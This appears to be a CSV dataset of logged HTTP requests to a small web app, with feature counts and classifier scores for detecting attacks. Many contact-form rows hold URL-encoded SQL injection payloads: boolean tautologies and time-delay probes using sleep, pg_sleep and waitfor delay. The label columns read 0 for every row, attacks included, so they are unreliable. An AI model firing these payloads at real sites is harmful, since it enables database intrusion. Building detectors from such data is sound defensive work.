,method,path,body,single_q,double_q,dashes,braces,spaces,badWords,type,prediction_label,prediction_score
517,POST,/contact,address=3137%20Laguna%20Street&firstName=-1'%20OR%202%2b483-483-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=service,1,0,1,0,6,0,0,0,1.0
518,GET,/,,0,0,0,0,0,4,0,0,1.0
519,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
520,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%40%40gsIgr&subject=na,0,0,0,0,2,0,0,0,0.9016
521,GET,/static/css/,,0,0,0,0,0,18,0,0,1.0
522,POST,/contact,address=3137%20Laguna%20Street&firstName=-1'%20OR%202%2b65-65-1%3d0%2b0%2b0%2b1%20or%20'HIbXYjgb'%3d'&lastName=pbwerxmf&message=20&subject=service,4,0,0,0,6,0,0,0,1.0
523,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=JyI%3d&subject=na,0,0,0,0,2,0,0,0,0.9016
524,GET,/,,0,0,0,0,0,4,0,0,1.0
525,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
526,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%22%20OR%202%2b793-793-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=service,0,1,1,0,6,0,0,0,1.0
527,GET,/login,,0,0,0,0,0,6,0,0,1.0
528,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%bf'%bf%22&subject=na,1,1,0,0,2,0,0,0,1.0
529,GET,/static/css/,,0,0,0,0,0,2,0,0,1.0
530,GET,/,,0,0,0,0,0,4,0,0,1.0
531,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
532,POST,/contact,address=3137%20Laguna%20Street&firstName=if(now()%3dsysdate()%2csleep(12)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(12)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(12)%2c0))OR%22*/&lastName=pbwerxmf&message=20&subject=service,2,2,0,14,2,3,0,0,1.0
533,GET,/login,,0,0,0,0,0,18,0,0,1.0
534,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%f0''%f0%22%22&subject=na,2,2,0,0,2,0,0,0,1.0
535,GET,/,,0,0,0,0,0,4,0,0,1.0
536,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
537,GET,/static/,,0,0,0,0,0,2,0,0,1.0
538,POST,/contact,address=3137%20Laguna%20Street&firstName=(select(0)from(select(sleep(4)))v)/*'%2b(select(0)from(select(sleep(4)))v)%2b'%22%2b(select(0)from(select(sleep(4)))v)%2b%22*/&lastName=pbwerxmf&message=20&subject=service,2,2,0,15,2,9,0,0,1.0
539,GET,/login,,0,0,0,0,0,4,0,0,1.0
540,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=(select%20convert(int%2cCHAR(65)))&subject=na,0,0,0,3,3,1,0,0,1.0
541,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
542,POST,/contact,address=3137%20Laguna%20Street&firstName=1%20waitfor%20delay%20'0:0:4'%20--%20&lastName=pbwerxmf&message=20&subject=service,2,0,1,0,7,2,0,0,1.0
543,GET,/login,,0,0,0,0,0,4,0,0,1.0
544,GET,/static/img/,,0,0,0,0,0,2,0,0,1.0
545,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
546,POST,/contact,address=3137%20Laguna%20Street&firstName=v1UUGnbS';%20waitfor%20delay%20'0:0:8'%20--%20&lastName=pbwerxmf&message=20&subject=service,3,0,1,0,7,2,0,0,1.0
547,GET,/login,,0,0,0,0,0,4,0,0,1.0
548,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=1'%22&subject=service,1,1,0,0,2,0,0,0,1.0
549,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
550,GET,/static/,,0,0,0,0,0,6,0,0,1.0
551,POST,/contact,address=3137%20Laguna%20Street&firstName=qNjnnc8l';select%20pg_sleep(8);%20--%20&lastName=pbwerxmf&message=20&subject=service,1,0,1,1,5,2,0,0,1.0
552,GET,/login,,0,0,0,0,0,4,0,0,1.0
553,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%5c&subject=service,0,0,0,0,2,0,0,0,0.9016
554,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
555,GET,/static/,,0,0,0,0,0,18,0,0,1.0
556,POST,/contact,address=3137%20Laguna%20Street&firstName=UvjTuvEb');select%20pg_sleep(12);%20--%20&lastName=pbwerxmf&message=20&subject=service,1,0,1,1,5,2,0,0,1.0
557,GET,/login,,0,0,0,0,0,4,0,0,1.0
558,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=1%00%c0%a7%c0%a2&subject=service,0,0,0,0,2,0,0,0,0.9016
559,GET,/static/,,0,0,0,0,0,4,0,0,1.0
560,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
561,POST,/contact,address=3137%20Laguna%20Street&firstName=kg0PG7Lr'));select%20pg_sleep(12);%20--%20&lastName=pbwerxmf&message=20&subject=service,1,0,1,1,5,2,0,0,1.0
562,GET,/login,,0,0,0,0,0,4,0,0,1.0
563,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%40%409LDql&subject=service,0,0,0,0,2,0,0,0,0.9016
564,GET,/static/img/,,0,0,0,0,0,6,0,0,1.0
565,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
566,GET,/static/,,0,0,0,0,0,4,0,0,1.0
567,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=JyI%3d&subject=service,0,0,0,0,2,0,0,0,0.9016
568,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
569,GET,/login,,0,0,0,0,0,4,0,0,1.0
570,GET,/static/img/,,0,0,0,0,0,18,0,0,1.0
571,GET,/static/,,0,0,0,0,0,4,0,0,1.0
572,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
573,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%bf'%bf%22&subject=service,1,1,0,0,2,0,0,0,1.0
574,GET,/static/css/,,0,0,0,0,0,2,0,0,1.0
575,GET,/static/,,0,0,0,0,0,4,0,0,1.0
576,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
577,GET,/login,,0,0,0,0,0,4,0,0,1.0
578,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%f0''%f0%22%22&subject=service,2,2,0,0,2,0,0,0,1.0
579,GET,/static/,,0,0,0,0,0,4,0,0,1.0
580,GET,/static/app/,,0,0,0,0,0,6,0,0,1.0
581,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
582,GET,/login,,0,0,0,0,0,4,0,0,1.0
583,GET,/,,0,0,0,0,0,6,0,0,1.0
584,POST,/contact,address=3137%20Laguna%20Street&firstName=8oZZZMku&lastName=pbwerxmf&message=20&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
585,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=(select%20convert(int%2cCHAR(65)))&subject=service,0,0,0,3,3,1,0,0,1.0
586,GET,/login,,0,0,0,0,0,4,0,0,1.0
587,GET,/static/app/,,0,0,0,0,0,18,0,0,1.0
588,GET,/static/,,0,0,0,0,0,4,0,0,1.0
589,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
590,GET,/,,0,0,0,0,0,18,0,0,1.0
591,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%20OR%202%2b166-166-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=suggestions,0,0,1,0,6,0,0,0,1.0
592,GET,/static/app/,,0,0,0,0,0,2,0,0,1.0
593,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
594,GET,/static/,,0,0,0,0,0,4,0,0,1.0
595,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
596,GET,/,,0,0,0,0,0,4,0,0,1.0
597,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%20OR%202%2b233-233-1%3d0%2b0%2b0%2b1&lastName=pbwerxmf&message=20&subject=suggestions,0,0,0,0,4,0,0,0,1.0
598,GET,/,,0,0,0,0,0,4,0,0,1.0
599,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
600,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=1'%22&subject=suggestions,1,1,0,0,2,0,0,0,1.0
601,GET,/static/,,0,0,0,0,0,4,0,0,1.0
602,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
603,POST,/contact,address=3137%20Laguna%20Street&firstName=-1'%20OR%202%2b394-394-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=suggestions,1,0,1,0,6,0,0,0,1.0
604,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%5c&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
605,GET,/,,0,0,0,0,0,4,0,0,1.0
606,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
607,GET,/static/,,0,0,0,0,0,4,0,0,1.0
608,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
609,POST,/contact,address=3137%20Laguna%20Street&firstName=-1'%20OR%202%2b440-440-1%3d0%2b0%2b0%2b1%20or%20'MDuvnG1c'%3d'&lastName=pbwerxmf&message=20&subject=suggestions,4,0,0,0,6,0,0,0,1.0
610,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
611,GET,/,,0,0,0,0,0,4,0,0,1.0
612,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=1%00%c0%a7%c0%a2&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
613,GET,/static/,,0,0,0,0,0,4,0,0,1.0
614,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
615,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%22%20OR%202%2b471-471-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=suggestions,0,1,1,0,6,0,0,0,1.0
616,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%40%40wNmdP&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
617,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
618,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
619,GET,/,,0,0,0,0,0,4,0,0,1.0
620,POST,/contact,address=3137%20Laguna%20Street&firstName=if(now()%3dsysdate()%2csleep(5)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(5)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(5)%2c0))OR%22*/&lastName=pbwerxmf&message=20&subject=suggestions,2,2,0,14,2,3,0,0,1.0
621,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=JyI%3d&subject=suggestions,0,0,0,0,2,0,0,0,0.9016
622,GET,/static/css/,,0,0,0,0,0,6,0,0,1.0
623,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
624,GET,/,,0,0,0,0,0,4,0,0,1.0
625,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
626,POST,/contact,address=3137%20Laguna%20Street&firstName=(select(0)from(select(sleep(10)))v)/*'%2b(select(0)from(select(sleep(10)))v)%2b'%22%2b(select(0)from(select(sleep(10)))v)%2b%22*/&lastName=pbwerxmf&message=20&subject=suggestions,2,2,0,15,2,9,0,0,1.0
627,GET,/static/css/,,0,0,0,0,0,18,0,0,1.0
628,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%bf'%bf%22&subject=suggestions,1,1,0,0,2,0,0,0,1.0
629,GET,/,,0,0,0,0,0,4,0,0,1.0
630,GET,/static/img/,,0,0,0,0,0,4,0,0,1.0
631,GET,/static/css/,,0,0,0,0,0,2,0,0,1.0
632,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
633,POST,/contact,address=3137%20Laguna%20Street&firstName=1%20waitfor%20delay%20'0:0:15'%20--%20&lastName=pbwerxmf&message=20&subject=suggestions,2,0,1,0,7,2,0,0,1.0
634,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
635,GET,/,,0,0,0,0,0,4,0,0,1.0
636,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%f0''%f0%22%22&subject=suggestions,2,2,0,0,2,0,0,0,1.0
637,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
638,POST,/contact,address=3137%20Laguna%20Street&firstName=TTpWaP85';%20waitfor%20delay%20'0:0:5'%20--%20&lastName=pbwerxmf&message=20&subject=suggestions,3,0,1,0,7,2,0,0,1.0
639,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
640,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=(select%20convert(int%2cCHAR(65)))&subject=suggestions,0,0,0,3,3,1,0,0,1.0
641,GET,/,,0,0,0,0,0,4,0,0,1.0
642,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
643,GET,/login,,0,0,0,0,0,6,0,0,1.0
644,POST,/contact,address=3137%20Laguna%20Street&firstName=XwlSD7mK';select%20pg_sleep(5);%20--%20&lastName=pbwerxmf&message=20&subject=suggestions,1,0,1,1,5,2,0,0,1.0
645,GET,/,,0,0,0,0,0,4,0,0,1.0
646,GET,/static/app/,,0,0,0,0,0,2,0,0,1.0
647,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
648,GET,/login,,0,0,0,0,0,18,0,0,1.0
649,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
650,POST,/contact,address=3137%20Laguna%20Street&firstName=UbBohmry');select%20pg_sleep(10);%20--%20&lastName=pbwerxmf&message=20&subject=suggestions,1,0,1,1,5,2,0,0,1.0
651,GET,/login,,0,0,0,0,0,4,0,0,1.0
652,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
653,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=1'%22&subject=product,1,1,0,0,2,0,0,0,1.0
654,POST,/contact,address=3137%20Laguna%20Street&firstName=p69qOi1r'));select%20pg_sleep(15);%20--%20&lastName=pbwerxmf&message=20&subject=suggestions,1,0,1,1,5,2,0,0,1.0
655,GET,/login,,0,0,0,0,0,4,0,0,1.0
656,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
657,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=pbwerxmf&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
658,GET,/static/,,0,0,0,0,0,6,0,0,1.0
659,GET,/login,,0,0,0,0,0,4,0,0,1.0
660,POST,/contact,address=3137%20Laguna%20Street&firstName=mIcdmwtA&lastName=pbwerxmf&message=20&subject=product,0,0,0,0,2,0,0,0,0.9016
661,GET,/login,,0,0,0,0,0,4,0,0,1.0
662,GET,/static/,,0,0,0,0,0,18,0,0,1.0
663,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%20OR%202%2b777-777-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=product,0,0,1,0,6,0,0,0,1.0
664,GET,/login,,0,0,0,0,0,4,0,0,1.0
665,GET,/static/,,0,0,0,0,0,4,0,0,1.0
666,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%5c&subject=product,0,0,0,0,2,0,0,0,0.9016
667,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=1%00%c0%a7%c0%a2&subject=product,0,0,0,0,2,0,0,0,0.9016
668,GET,/login,,0,0,0,0,0,4,0,0,1.0
669,GET,/static/,,0,0,0,0,0,4,0,0,1.0
670,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%20OR%202%2b929-929-1%3d0%2b0%2b0%2b1&lastName=pbwerxmf&message=20&subject=product,0,0,0,0,4,0,0,0,1.0
671,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%40%40ACFqn&subject=product,0,0,0,0,2,0,0,0,0.9016
672,GET,/login,,0,0,0,0,0,4,0,0,1.0
673,GET,/static/,,0,0,0,0,0,4,0,0,1.0
674,POST,/contact,address=3137%20Laguna%20Street&firstName=-1'%20OR%202%2b78-78-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=product,1,0,1,0,6,0,0,0,1.0
675,GET,/login,,0,0,0,0,0,4,0,0,1.0
676,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=JyI%3d&subject=product,0,0,0,0,2,0,0,0,0.9016
677,GET,/static/css/,,0,0,0,0,0,2,0,0,1.0
678,GET,/static/,,0,0,0,0,0,4,0,0,1.0
679,POST,/contact,address=3137%20Laguna%20Street&firstName=-1'%20OR%202%2b139-139-1%3d0%2b0%2b0%2b1%20or%20'1HsksUjR'%3d'&lastName=pbwerxmf&message=20&subject=product,4,0,0,0,6,0,0,0,1.0
680,POST,/contact,address=3137%20Laguna%20Street&firstName=-1%22%20OR%202%2b168-168-1%3d0%2b0%2b0%2b1%20--%20&lastName=pbwerxmf&message=20&subject=product,0,1,1,0,6,0,0,0,1.0
681,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%bf'%bf%22&subject=product,1,1,0,0,2,0,0,0,1.0
682,GET,/static/app/,,0,0,0,0,0,6,0,0,1.0
683,GET,/,,0,0,0,0,0,6,0,0,1.0
684,GET,/static/,,0,0,0,0,0,4,0,0,1.0
685,GET,/static/app/,,0,0,0,0,0,2,0,0,1.0
686,GET,/login,,0,0,0,0,0,4,0,0,1.0
687,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=%f0''%f0%22%22&subject=product,2,2,0,0,2,0,0,0,1.0
688,GET,/,,0,0,0,0,0,18,0,0,1.0
689,POST,/contact,address=3137%20Laguna%20Street&firstName=if(now()%3dsysdate()%2csleep(18)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(18)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(18)%2c0))OR%22*/&lastName=pbwerxmf&message=20&subject=product,2,2,0,14,2,3,0,0,1.0
690,GET,/static/app/,,0,0,0,0,0,18,0,0,1.0
691,GET,/login,,0,0,0,0,0,4,0,0,1.0
692,GET,/static/,,0,0,0,0,0,4,0,0,1.0
693,GET,/static/css/,,0,0,0,0,0,6,0,0,1.0
694,GET,/,,0,0,0,0,0,4,0,0,1.0
695,POST,/contact,address=3137%20Laguna%20Street&firstName=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/&lastName=pbwerxmf&message=20&subject=product,2,2,0,15,2,9,0,0,1.0
696,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=(select%20convert(int%2cCHAR(65)))&subject=product,0,0,0,3,3,1,0,0,1.0
697,GET,/static/,,0,0,0,0,0,4,0,0,1.0
698,POST,/contact,address=3137%20Laguna%20Street&firstName=1%20waitfor%20delay%20'0:0:6'%20--%20&lastName=pbwerxmf&message=20&subject=product,2,0,1,0,7,2,0,0,1.0
699,GET,/static/,,0,0,0,0,0,4,0,0,1.0
700,GET,/static/css/,,0,0,0,0,0,18,0,0,1.0
701,GET,/,,0,0,0,0,0,4,0,0,1.0
702,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=1'%22,1,1,0,0,2,0,0,0,1.0
703,POST,/contact,address=3137%20Laguna%20Street&firstName=8nI7EZCy';%20waitfor%20delay%20'0:0:12'%20--%20&lastName=pbwerxmf&message=20&subject=product,3,0,1,0,7,2,0,0,1.0
704,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
705,GET,/,,0,0,0,0,0,4,0,0,1.0
706,GET,/static/,,0,0,0,0,0,4,0,0,1.0
707,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=%5c,0,0,0,0,2,0,0,0,0.9016
708,POST,/contact,address=3137%20Laguna%20Street&firstName=KE3txnyj';select%20pg_sleep(18);%20--%20&lastName=pbwerxmf&message=20&subject=product,1,0,1,1,5,2,0,0,1.0
709,GET,/static/,,0,0,0,0,0,4,0,0,1.0
710,GET,/,,0,0,0,0,0,4,0,0,1.0
711,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
712,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
713,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=1%00%c0%a7%c0%a2,0,0,0,0,2,0,0,0,0.9016
714,POST,/contact,address=3137%20Laguna%20Street&firstName=vLRqrxMU');select%20pg_sleep(6);%20--%20&lastName=pbwerxmf&message=20&subject=product,1,0,1,1,5,2,0,0,1.0
715,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
716,GET,/,,0,0,0,0,0,4,0,0,1.0
717,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
718,POST,/contact,address=3137%20Laguna%20Street&firstName=Jo18lHzB'));select%20pg_sleep(6);%20--%20&lastName=pbwerxmf&message=20&subject=product,1,0,1,1,5,2,0,0,1.0
719,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=%40%401p8qN,0,0,0,0,2,0,0,0,0.9016
720,GET,/,,0,0,0,0,0,4,0,0,1.0
721,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
722,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
723,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=JyI%3d,0,0,0,0,2,0,0,0,0.9016
724,GET,/,,0,0,0,0,0,4,0,0,1.0
725,GET,/static/css/,,0,0,0,0,0,2,0,0,1.0
726,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
727,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
728,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=%bf'%bf%22,1,1,0,0,2,0,0,0,1.0
729,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
730,GET,/static/app/,,0,0,0,0,0,2,0,0,1.0
731,GET,/,,0,0,0,0,0,4,0,0,1.0
732,GET,/static/app/,,0,0,0,0,0,4,0,0,1.0
733,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=kzSecbnF&message=20&subject=na,0,0,0,0,2,0,0,0,0.9016
734,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=%f0''%f0%22%22,2,2,0,0,2,0,0,0,1.0
735,GET,/login,,0,0,0,0,0,6,0,0,1.0
736,GET,/,,0,0,0,0,0,4,0,0,1.0
737,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
738,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
739,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%202%2b561-561-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=na,0,0,1,0,6,0,0,0,1.0
740,POST,/contact,address=3137%20Laguna%20Street&firstName=kklotbxs&lastName=kklotbxs&message=20&subject=(select%20convert(int%2cCHAR(65))),0,0,0,3,3,1,0,0,1.0
741,GET,/,,0,0,0,0,0,4,0,0,1.0
742,GET,/login,,0,0,0,0,0,18,0,0,1.0
743,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
744,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%203%2b561-561-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=na,0,0,1,0,6,0,0,0,1.0
745,GET,/login,,0,0,0,0,0,4,0,0,1.0
746,GET,/static/css/,,0,0,0,0,0,4,0,0,1.0
747,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%203*2<(0%2b5%2b561-561)%20--%20&message=20&subject=na,0,0,1,1,6,0,0,0,1.0
748,GET,/login,,0,0,0,0,0,4,0,0,1.0
749,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%203*2>(0%2b5%2b561-561)%20--%20&message=20&subject=na,0,0,1,1,6,0,0,0,1.0
750,GET,/static/,,0,0,0,0,0,6,0,0,1.0
751,GET,/login,,0,0,0,0,0,4,0,0,1.0
752,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%20OR%202%2b59-59-1%3d0%2b0%2b0%2b1&message=20&subject=na,0,0,0,0,4,0,0,0,1.0
753,GET,/static/,,0,0,0,0,0,18,0,0,1.0
754,GET,/login,,0,0,0,0,0,4,0,0,1.0
755,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%202%2b769-769-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=na,1,0,1,0,6,0,0,0,1.0
756,GET,/static/,,0,0,0,0,0,4,0,0,1.0
757,GET,/login,,0,0,0,0,0,4,0,0,1.0
758,GET,/static/css/,,0,0,0,0,0,2,0,0,1.0
759,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%203%2b769-769-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=na,1,0,1,0,6,0,0,0,1.0
760,GET,/login,,0,0,0,0,0,4,0,0,1.0
761,GET,/static/,,0,0,0,0,0,4,0,0,1.0
762,GET,/static/app/,,0,0,0,0,0,2,0,0,1.0
763,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%203*2<(0%2b5%2b769-769)%20--%20&message=20&subject=na,1,0,1,1,6,0,0,0,1.0
764,GET,/static/,,0,0,0,0,0,4,0,0,1.0
765,GET,/login,,0,0,0,0,0,4,0,0,1.0
766,GET,/static/app/,,0,0,0,0,0,6,0,0,1.0
767,GET,/static/,,0,0,0,0,0,4,0,0,1.0
768,GET,/login,,0,0,0,0,0,4,0,0,1.0
769,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%203*2>(0%2b5%2b769-769)%20--%20&message=20&subject=na,1,0,1,1,6,0,0,0,1.0
770,GET,/static/,,0,0,0,0,0,4,0,0,1.0
771,GET,/login,,0,0,0,0,0,4,0,0,1.0
772,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1'%20OR%202%2b894-894-1%3d0%2b0%2b0%2b1%20or%20'tcKRxEBF'%3d'&message=20&subject=na,4,0,0,0,6,0,0,0,1.0
773,GET,/static/app/libs/,,0,0,0,0,0,6,0,0,1.0
774,GET,/,,0,0,0,0,0,6,0,0,1.0
775,GET,/static/,,0,0,0,0,0,4,0,0,1.0
776,POST,/contact,address=3137%20Laguna%20Street&firstName=pbwerxmf&lastName=-1%22%20OR%202%2b180-180-1%3d0%2b0%2b0%2b1%20--%20&message=20&subject=na,0,1,1,0,6,0,0,0,1.0
777,GET,/login,,0,0,0,0,0,4,0,0,1.0
778,GET,/,,0,0,0,0,0,18,0,0,1.0
779,GET,/static/app/libs/,,0,0,0,0,0,18,0,0,1.0
780,GET,/static/css/,,0,0,0,0,0,6,0,0,1.0
